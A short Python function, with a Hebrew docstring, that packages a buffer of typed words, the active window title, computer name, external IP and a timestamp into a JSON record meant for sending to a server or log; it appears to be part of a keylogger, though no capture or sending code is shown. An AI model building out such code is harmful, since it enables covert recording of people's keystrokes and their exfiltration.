import datetime

def build_log_json(computer_name, external_ip, words_buffer, current_window_title):
    """
    בונה את מבנה ה-JSON לצורך שליחה לשרת או לוג.
    """
    line = ' '.join(words_buffer)
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    return {
        "computer_name": computer_name,
        "external_ip": external_ip,
        "timestamp": timestamp,
        "log": line,
        "active_window": current_window_title
    }, timestamp, line
